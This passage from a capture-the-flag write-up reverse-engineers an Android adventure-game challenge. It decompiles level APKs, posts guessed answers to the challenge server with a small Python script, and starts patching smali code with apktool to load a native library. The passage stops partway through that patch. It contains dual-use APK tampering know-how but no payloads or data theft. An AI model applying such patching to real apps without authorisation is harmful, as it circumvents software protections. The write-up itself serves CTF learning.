<span class="line"><span style="color:#666666">        }</span><span style="color:#4D9375"> else</span><span style="color:#4D9375"> if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">c </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">            e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42161935184166L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">            aVar</span><span style="color:#666666">.</span><span style="color:#80A665">execute</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1855q</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> string2</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Level03.apk</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42076035838246L</span><span style="color:#666666">));</span></span>
<span class="line"><span style="color:#666666">        }</span><span style="color:#4D9375"> else</span><span style="color:#4D9375"> if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">c </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#666666">        }</span><span style="color:#4D9375"> else</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">            e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">42080330805542L</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">            aVar</span><span style="color:#666666">.</span><span style="color:#80A665">execute</span><span style="color:#666666">(</span><span style="color:#C99076">this</span><span style="color:#666666">.</span><span style="color:#BD976A">f1855q</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> string2</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">SecretEnding.zip</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#80A665"> getApplicationInfo</span><span style="color:#666666">().</span><span style="color:#BD976A">dataDir</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#666666">    }</span><span style="color:#4D9375"> catch</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">IllegalAccessException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> InstantiationException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> InterruptedException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> NoSuchMethodException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> ExecutionException </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> JSONException </span><span style="color:#BD976A">unused</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">        context </span><span style="color:#666666">=</span><span style="color:#BD976A"> view</span><span style="color:#666666">.</span><span style="color:#80A665">getContext</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#DBD7CAEE">        j2 </span><span style="color:#666666">=</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">42041676099878L</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">j2</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        Toast</span><span style="color:#666666">.</span><span style="color:#80A665">makeText</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">context</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Common Error</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">).</span><span style="color:#80A665">show</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">    }</span><span style="color:#4D9375"> catch</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">InvocationTargetException </span><span style="color:#BD976A">unused2</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">        context </span><span style="color:#666666">=</span><span style="color:#BD976A"> view</span><span style="color:#666666">.</span><span style="color:#80A665">getContext</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#DBD7CAEE">        j2 </span><span style="color:#666666">=</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">41960071721254L</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#BD976A">        e</span><span style="color:#666666">.</span><span style="color:#80A665">r</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">j2</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">        Toast</span><span style="color:#666666">.</span><span style="color:#80A665">makeText</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">context</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Common Error</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">).</span><span style="color:#80A665">show</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>When you click a button, it will send a JSON POST request to <code>http://gamebox1.reply.it/870af13cd49ecc64128cfb08b87a362c7e918f8a/ab396cd2b1d8a7d4fb5c1e137224004a0261976d</code> with the <code>gameStory</code> String returned from the loaded level APK.</p>
<p>Let’s use this simple script to try the <code>Level01</code> answers.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> requests</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">level</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> choise</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    r </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> requests</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">post</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">http://gamebox1.reply.it/870af13cd49ecc64128cfb08b87a362c7e918f8a/ab396cd2b1d8a7d4fb5c1e137224004a0261976d</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#BD976A">        json</span><span style="color:#666666">={</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> level</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Choise</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> choise</span><span style="color:#666666">},</span></span>
<span class="line"><span style="color:#666666">    )</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">json</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level01</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Try going through the dark corridor</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level01</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Try lighting one of the torch</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level01</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Try throwing an object across the corridor!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span></span>
<span class="line"></span></code></pre>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#666666">{</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">endpoint</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">none</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">response</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">DEAD: The floor opened up, leaving you to fall into a pit of spikes that skewered you, that's very much a cliché isn't it?</span><span style="color:#C98A7D77">"</span><span style="color:#666666">}</span></span>
<span class="line"><span style="color:#666666">{</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">endpoint</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">none</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">response</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">You ligh torch... Seems pretty normal</span><span style="color:#C98A7D77">'</span><span style="color:#666666">}</span></span>
<span class="line"><span style="color:#666666">{</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">endpoint</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">738cdd7ae1318b812d3fd6b758e75752fc88e8d6</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">response</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">SUCCEDED: The floor has opened, giving you a glimpse of a deep pit; however, it appears that a door on the right has just opened.</span><span style="color:#C98A7D77">'</span><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>We got a valid response with the last one!</p>
<p>Let’s try with <code>http://gamebox1.reply.it/870af13cd49ecc64128cfb08b87a362c7e918f8a/738cdd7ae1318b812d3fd6b758e75752fc88e8d6</code>. It’s another APK, probably Level02, let’s open it with JaDX.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> class</span><span style="color:#5DA994"> Level02</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">    MyAsyncTasks</span><span style="color:#BD976A"> asyncTasks</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> MyAsyncTasks</span><span style="color:#666666">();</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnQuestImage</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">gargoyle</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnFirstOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Take courage and fight it!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnSecondOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Try offering him flowers!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnThirdOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Try to make friend with him!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnFourthOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Go back to home...</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnStory</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">A monstrous gargoyle is standing in your way! How lucky you are!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">gameStory</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">String </span><span style="color:#BD976A">choise</span><span style="color:#666666">)</span><span style="color:#CB7676"> throws</span><span style="color:#DBD7CAEE"> JSONException </span><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#BD976A">        Log</span><span style="color:#666666">.</span><span style="color:#80A665">d</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">TODO</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Bob I think you forgot to add the real answer. It should be the name of the weapon, I don't remember which one you chose, when you're done return it from &#x3C;backend>/getWeapon</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> JSONObject</span><span style="color:#666666">().</span><span style="color:#80A665">put</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Level02</span><span style="color:#C98A7D77">"</span><span style="color:#666666">).</span><span style="color:#80A665">put</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Choise</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> choise</span><span style="color:#666666">).</span><span style="color:#80A665">toString</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>There is a TODO that says that the answer is not in here. Let’s try with <code>http://gamebox1.reply.it/870af13cd49ecc64128cfb08b87a362c7e918f8a/getWeapon</code>. It downloads a file name <code>halberd.png</code>. Could this be the real answer?</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> requests</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> send</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">level</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> choise</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    r </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> requests</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">post</span><span style="color:#666666">(</span></span>
<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">http://gamebox1.reply.it/870af13cd49ecc64128cfb08b87a362c7e918f8a/ab396cd2b1d8a7d4fb5c1e137224004a0261976d</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#BD976A">        json</span><span style="color:#666666">={</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> level</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Choise</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> choise</span><span style="color:#666666">},</span></span>
<span class="line"><span style="color:#666666">    )</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">json</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">send</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level02</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">halberd</span><span style="color:#C98A7D77">"</span><span style="color:#666666">))</span></span>
<span class="line"></span></code></pre>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#666666">{</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">endpoint</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">bf850ea44b0542ff96645c9d0e4160127d1996de</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">response</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">SUCCEDED: Wait! How did you get here? Well, great! I'm downloading the level 3 files for you...</span><span style="color:#C98A7D77">"</span><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>Yes, it is! Let’s go further.
Another APK, same thing.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#CB7676">public</span><span style="color:#CB7676"> class</span><span style="color:#5DA994"> Level03</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#CB7676"> native</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">testAES</span><span style="color:#666666">();</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnQuestImage</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">brutalhelm</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnFirstOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Fight him to death!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnSecondOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Throw the repaired weapon at him!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnThirdOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Run away!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnFourthOption</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Go back to home...</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">returnStory</span><span style="color:#666666">()</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">My god! This is the final boss! (Yes this game is quite short...) Make your choice hero!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    public</span><span style="color:#DBD7CAEE"> String </span><span style="color:#80A665">gameStory</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">String </span><span style="color:#BD976A">choise</span><span style="color:#666666">)</span><span style="color:#CB7676"> throws</span><span style="color:#DBD7CAEE"> JSONException </span><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#666666"> (</span><span style="color:#CB7676">!</span><span style="color:#BD976A">choise</span><span style="color:#666666">.</span><span style="color:#80A665">equals</span><span style="color:#666666">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">))</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">            try</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                Log</span><span style="color:#666666">.</span><span style="color:#80A665">d</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">TODO</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Bob I think you forgot to add the path to the native library!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#BD976A">                System</span><span style="color:#666666">.</span><span style="color:#80A665">load</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">TODO</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">                String</span><span style="color:#BD976A"> value</span><span style="color:#666666"> =</span><span style="color:#80A665"> testAES</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#BD976A">                System</span><span style="color:#666666">.</span><span style="color:#BD976A">out</span><span style="color:#666666">.</span><span style="color:#80A665">println</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">value</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">                JSONObject</span><span style="color:#BD976A"> put</span><span style="color:#666666"> =</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> JSONObject</span><span style="color:#666666">().</span><span style="color:#80A665">put</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">LevelEnding</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">                return</span><span style="color:#BD976A"> put</span><span style="color:#666666">.</span><span style="color:#80A665">put</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Choise</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> value </span><span style="color:#CB7676">+</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">_CorrectAnswer!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">).</span><span style="color:#80A665">toString</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">            }</span><span style="color:#4D9375"> catch</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">Exception </span><span style="color:#666666">|</span><span style="color:#DBD7CAEE"> UnsatisfiedLinkError </span><span style="color:#BD976A">e</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#BD976A">                e</span><span style="color:#666666">.</span><span style="color:#80A665">printStackTrace</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#4D9375">                return</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> JSONObject</span><span style="color:#666666">().</span><span style="color:#80A665">put</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Level03</span><span style="color:#C98A7D77">"</span><span style="color:#666666">).</span><span style="color:#80A665">put</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Choise</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> choise</span><span style="color:#666666">).</span><span style="color:#80A665">toString</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">            }</span></span>
<span class="line"><span style="color:#666666">        }</span></span>
<span class="line"><span style="color:#4D9375">        return</span><span style="color:#4D9375"> new</span><span style="color:#80A665"> JSONObject</span><span style="color:#666666">().</span><span style="color:#80A665">put</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Level</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Level03</span><span style="color:#C98A7D77">"</span><span style="color:#666666">).</span><span style="color:#80A665">put</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Choise</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">My god! This is the final boss! (Yes this game is quite short...) Make your choice hero!</span><span style="color:#C98A7D77">"</span><span style="color:#666666">).</span><span style="color:#80A665">toString</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#666666">    }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>This time there is also a <code>native testAES()</code>, so there is probably a native lib inside this APK. We found <code>liblevel03.so</code>.</p>
<p>Let’s try running it like this.
Nope, it doesn’t work. Why? Because of this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#BD976A">System</span><span style="color:#666666">.</span><span style="color:#80A665">load</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">TODO</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"></span></code></pre>
<p>You need to call <code>System.load()</code> with an absolute path poiting to a native library.</p>
<p>Let’s patch the APK using <code>Apktool</code>. First, we decode it using:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>apktool d -p . -r level03.apk</span></span>
<span class="line"><span></span></span></code></pre>
<p>Then, we search for “TODO”:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>grep -R TODO level03</span></span>
<span class="line"><span>level03/smali_classes4/com/example/level03/Level03.smali:    const-string v0, "TODO"</span></span>
<span class="line"><span></span></span></code></pre>
<p>Lastly, edit <code>level03/smali_classes4/com/example/level03/Level03.smali</code> from this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>.line 43</span></span>
<span class="line"><span>invoke-static {v0}, Ljava/lang/System;->load(Ljava/lang/String;)V</span></span>
<span class="line"><span></span></span></code></pre>
<p>to this:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>.line 43</span></span>
